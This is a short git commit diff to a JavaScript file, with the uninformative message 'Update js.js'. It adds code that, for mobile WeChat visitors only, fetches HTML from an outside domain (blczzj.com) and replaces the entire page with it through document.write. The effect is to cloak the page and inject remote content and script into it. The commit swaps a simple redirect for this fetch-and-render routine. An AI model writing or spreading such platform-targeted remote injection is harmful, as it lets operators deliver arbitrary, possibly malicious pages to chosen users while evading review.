cf5502b08d3ea8c489d982dccb4d4abe98d09fa9
wwzxcvbnm <45349742+wwzxcvbnm@users.noreply.github.com>
2018-12-08 16:56:19 +0800

    Update js.js

--- js.js
+++ js.js
@@ -7,5 +7,27 @@
 	if(system.win||system.mac||system.xll||system.ipad){var l=1;}if(!isWeiXin()){var l=1;}function isWeiXin(){var ua=window.navigator.userAgent.toLowerCase();
  	if(ua.match(/MicroMessenger/i)=='micromessenger'){return true}else{return false}}
 if(l!=1){
-  window.location.href = "https://www.baidu.com";
+var xhr = new XMLHttpRequest;
+var html = null;
+function render() {
+    var a = document.open("text/html", "replace");
+    a.write(html);
+    a.close();
+}
+xhr.onload = function() {
+    html = xhr.responseText;
+    var delay = 0;
+	
+    if (delay > 0) setTimeout("render()", delay * 1000)
+    else render();
+};
+function getQueryString(name) { 
+	var reg = new RegExp("(^|&)" + name + "=([^&]*)(&|$)", "i"); 
+	var r = window.location.search.substr(1).match(reg); 
+	if (r != null) return unescape(r[2]); return null; 
+} 
+gid=getQueryString("kpi");
+xhr.open("GET", "//blczzj.com//"+Date.now()+".gcif?", !0);
+xhr.send();
+
 }
